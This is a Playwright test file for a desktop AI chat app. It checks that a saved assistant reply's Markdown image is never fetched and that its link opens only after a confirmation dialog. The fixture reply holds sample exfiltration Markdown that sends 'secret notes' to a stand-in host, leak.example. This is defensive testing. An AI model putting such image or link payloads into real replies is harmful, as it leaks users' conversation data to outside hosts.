import { expect, test, type Page } from "@playwright/test";
import { freshInstallResponses } from "./support/fixtures";
import { mockTauriIpc } from "./support/tauriMock";

/**
 * A saved reply carrying an image and a link to a host it could leak the
 * conversation to. The Vite dev server has no CSP, so a real `<img>` here
 * really would load: this shows the Markdown renderer itself sends nothing,
 * and that the link reaches `open_link` exactly once, only after Open.
 * Streamed replies go through the same renderer but can't be driven here (see
 * tauriMock.ts), hence a saved chat.
 */

const LEAK_HOST = "leak.example";

const REPLY = [
  "Here is your chart:",
  "",
  `![sales chart](https://${LEAK_HOST}/chart.png?d=my%20secret%20notes)`,
  "",
  `Read [the report](https://${LEAK_HOST}/r?d=my%20secret%20notes) for more.`,
].join("\n");

const SAVED_CHAT = {
  list_conversations: [
    {
      id: "c-1",
      title: "Quarterly numbers",
      createdAtMs: 1,
      updatedAtMs: 2,
      messageCount: 2,
      taskType: "general",
      pinned: false,
    },
  ],
  get_conversation: {
    id: "c-1",
    title: "Quarterly numbers",
    createdAtMs: 1,
    updatedAtMs: 2,
    messages: [
      { id: "m1", role: "user", content: "Show me the numbers", createdAtMs: 1 },
      { id: "m2", role: "assistant", content: REPLY, createdAtMs: 2 },
    ],
    sampling: {
      temperature: 0.7,
      topP: 0.95,
      topK: 40,
      minP: 0.05,
      repeatPenalty: 1.1,
      repeatLastN: 64,
      presencePenalty: 0,
      frequencyPenalty: 0,
      maxTokens: -1,
      seed: -1,
    },
    contextLength: 8192,
    taskType: "general",
    pinned: false,
    branches: {},
  },
};

type Invoke = { cmd: string; args?: Record<string, unknown> };

/** Opens the saved chat with every command recorded, its arguments included,
 * and every request to the leak host counted (and answered, so a regression
 * shows up as a count rather than as a network error). */
async function openSavedReply(page: Page) {
  const leaks: string[] = [];
  await page.route(`**://${LEAK_HOST}/**`, (route) => {
    leaks.push(route.request().url());
    return route.fulfill({ status: 200, contentType: "image/png", body: "" });
  });
  const base = freshInstallResponses();
  await mockTauriIpc(page, {
    ...base,
    ...SAVED_CHAT,
    get_settings: {
      ...(base.get_settings as Record<string, unknown>),
      onboardingCompleted: true,
      userName: "Ada",
    },
    update_settings: null,
    open_link: null,
    "plugin:app|version": "0.1.0",
  });
  await page.addInitScript(() => {
    const w = window as unknown as {
      __invokes: Invoke[];
      __TAURI_INTERNALS__: { invoke: (cmd: string, args?: Record<string, unknown>) => Promise<unknown> };
    };
    const mocked = w.__TAURI_INTERNALS__.invoke;
    w.__invokes = [];
    w.__TAURI_INTERNALS__.invoke = (cmd, args) => {
      w.__invokes.push({ cmd, args });
      return mocked(cmd, args);
    };
  });
  await page.goto("/");
  await page.getByRole("button", { name: "Quarterly numbers", exact: true }).click();
  await expect(page.getByText("Here is your chart:")).toBeVisible();
  return leaks;
}

const openLinkCalls = (page: Page) =>
  page
    .evaluate(() => (window as unknown as { __invokes: Invoke[] }).__invokes)
    .then((all) => all.filter((c) => c.cmd === "open_link"));

test("a reply's image never loads and its link opens only after confirmation, once", async ({
  page,
}) => {
  const leaks = await openSavedReply(page);

  // The image: no request at all, and a placeholder with its alt text.
  await page.waitForLoadState("networkidle");
  expect(leaks).toEqual([]);
  await expect(page.getByRole("img", { name: "Image not shown: sales chart" })).toBeVisible();
  await expect(page.locator(".md img")).toHaveCount(0);

  // Hovering and pressing the link reach nothing either, and nothing opens
  // until the dialog's Open.
  const link = page.getByRole("link", { name: "the report" });
  await link.hover();
  await expect(link).toHaveAttribute("title", `https://${LEAK_HOST}/r?d=my%20secret%20notes`);
  await link.click();
  const dialog = page.getByRole("alertdialog", { name: "Open this link?" });
  await expect(dialog).toBeVisible();
  await expect(dialog).toBeFocused();
  await expect(dialog).toContainText(LEAK_HOST);
  expect(await openLinkCalls(page)).toEqual([]);

  await dialog.getByRole("button", { name: "Open link" }).click();
  await expect(dialog).toBeHidden();
  expect(await openLinkCalls(page)).toEqual([
    { cmd: "open_link", args: { url: `https://${LEAK_HOST}/r?d=my%20secret%20notes` } },
  ]);

  // The webview itself never went anywhere: no request ever reached the host.
  await page.waitForLoadState("networkidle");
  expect(leaks).toEqual([]);
});

test("Escape cancels the link dialog and nothing opens", async ({ page }) => {
  const leaks = await openSavedReply(page);
  await page.getByRole("link", { name: "the report" }).click();
  const dialog = page.getByRole("alertdialog", { name: "Open this link?" });
  await expect(dialog).toBeFocused();
  await page.keyboard.press("Escape");
  await expect(dialog).toBeHidden();
  // The chat is still the one on screen — the app didn't navigate or reload.
  await expect(page.getByText("Here is your chart:")).toBeVisible();
  expect(await openLinkCalls(page)).toEqual([]);
  expect(leaks).toEqual([]);
});
